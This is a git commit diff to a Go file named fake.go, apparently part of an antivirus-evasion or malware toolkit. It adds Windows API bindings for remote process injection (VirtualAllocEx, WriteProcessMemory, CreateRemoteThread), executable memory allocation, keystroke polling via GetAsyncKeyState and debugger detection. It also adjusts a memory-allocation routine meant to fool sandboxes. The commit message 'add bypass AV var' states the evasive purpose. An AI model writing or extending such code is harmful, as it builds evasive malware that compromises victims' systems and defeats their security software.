c4d7bff9b6d08ccc35a5476dd92158b7271065ea
Rahmat Wahyu Hadi <hrahmatwahyu@gmail.com>
2020-02-06 11:22:51 +0700

    add bypass AV var

--- src/fake/fake.go
+++ src/fake/fake.go
@@ -1,6 +1,28 @@
 package fake
 
+import "syscall"
+
 var MagicNumber int64 = 0
+
+const MEM_COMMIT = 0x1000
+const MEM_RESERVE = 0x2000
+const PAGE_EXECUTE_READWRITE = 0x40
+const PROCESS_CREATE_THREAD = 0x0002
+const PROCESS_QUERY_INFORMATION = 0x0400
+const PROCESS_VM_OPERATION = 0x0008
+const PROCESS_VM_WRITE = 0x0020
+const PROCESS_VM_READ = 0x0010
+
+var K32 = syscall.MustLoadDLL("kernel32.dll")  //kernel32.dll
+var USER32 = syscall.MustLoadDLL("user32.dll") //user32.dll
+var GetAsyncKeyState = USER32.MustFindProc("GetAsyncKeyState")
+var VirtualAlloc = K32.MustFindProc("VirtualAlloc")
+var CreateThread = K32.MustFindProc("CreateThread")
+var VirtualAllocEx = K32.MustFindProc("VirtualAllocEx")
+var CreateRemoteThread = K32.MustFindProc("CreateRemoteThread")
+var WriteProcessMemory = K32.MustFindProc("WriteProcessMemory")
+var OpenProcess = K32.MustFindProc("OpenProcess")
+var IsDebuggerPresent = K32.MustFindProc("IsDebuggerPresent")
 
 func BypassAV(Rate int) {
 	if Rate == 1 {
@@ -22,10 +44,10 @@ func Jump() {
 
 func AllocateFakeMemory() {
 	for i := 0; i < 1000; i++ {
-		var Size int = 30000000
+		var Size int = 3000000
 		Buffer_1 := make([]byte, Size)
 		Buffer_1[0] = 1
-		var Buffer_2 [102400000]byte
+		var Buffer_2 [10240000]byte
 		Buffer_2[0] = 0
 	}
 }
